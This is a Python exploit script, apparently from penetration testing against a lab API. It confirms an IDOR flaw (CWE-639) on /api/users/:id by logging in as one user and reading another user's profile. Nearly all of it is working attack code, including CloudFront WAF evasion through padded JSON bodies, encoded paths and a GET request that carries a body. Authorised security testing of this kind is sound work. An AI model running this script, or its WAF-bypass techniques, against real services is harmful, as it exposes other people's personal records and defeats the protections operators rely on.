#!/usr/bin/env python3
"""
AUTHZ-VULN-01 (IDOR on /api/users/:id) test with CloudFront WAF bypass.

Scenario: authenticated user can read another user's record by changing the ID.
Reference: CWE-639 — Authorization Bypass Through User-Controlled Key.
"""

from __future__ import annotations

import argparse
import json
import sys

import requests

from waf_bypass import encode_path, merge_headers, pad_json_body


def login(base_url: str, email: str, password: str, *, waf_bypass: bool) -> str:
    url = base_url.rstrip("/") + "/api/auth/login"
    payload = {"email": email, "password": password}
    headers = merge_headers({"Content-Type": "application/json"}, None)
    body = pad_json_body(payload) if waf_bypass else json.dumps(payload).encode()
    response = requests.post(url, data=body, headers=headers, timeout=30)
    response.raise_for_status()
    data = response.json()
    token = data.get("token")
    if not token:
        raise RuntimeError(f"No token in login response: {data}")
    return token


def fetch_user(base_url: str, user_id: int, token: str, *, waf_bypass: bool, encoded_path: bool) -> requests.Response:
    path = f"/api/users/{user_id}"
    if encoded_path:
        path = encode_path(path)
    url = base_url.rstrip("/") + path
    headers = merge_headers(
        {"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
        None,
    )
    # GET with padded body is non-standard but exercises WAF body-window bypass on some proxies.
    if waf_bypass:
        return requests.request(
            "GET",
            url,
            headers=headers,
            data=pad_json_body({"probe": True}),
            timeout=30,
        )
    return requests.get(url, headers=headers, timeout=30)


def main() -> int:
    parser = argparse.ArgumentParser(description="AUTHZ-VULN-01 IDOR test")
    parser.add_argument("-u", "--url", required=True, help="API base URL")
    parser.add_argument("--email", default="user2@lab.local")
    parser.add_argument("--password", default="password2")
    parser.add_argument("--victim-id", type=int, default=1, help="User ID to access without authorization")
    parser.add_argument("--no-waf-bypass", action="store_true")
    parser.add_argument("--encoded-path", action="store_true")
    args = parser.parse_args()

    print(f"[*] AUTHZ-VULN-01 test against {args.url}")
    token = login(args.url, args.email, args.password, waf_bypass=not args.no_waf_bypass)
    print("[+] Obtained session token")

    response = fetch_user(
        args.url,
        args.victim_id,
        token,
        waf_bypass=not args.no_waf_bypass,
        encoded_path=args.encoded_path,
    )
    print(f"[*] GET /api/users/{args.victim_id} -> HTTP {response.status_code}")

    if response.status_code == 403:
        print("[-] Blocked by WAF — retry with WAF bypass enabled")
        return 2

    if response.status_code != 200:
        print(f"[-] Unexpected status: {response.text[:500]}")
        return 1

    body = response.json()
    email = body.get("email", "")
    print(f"[+] Response: {json.dumps(body, indent=2)}")

    if email and email != args.email:
        print(f"[!] AUTHZ-VULN-01 CONFIRMED: authenticated as {args.email} but read {email}'s profile")
        return 0

    print("[-] IDOR not demonstrated (same user or empty record)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
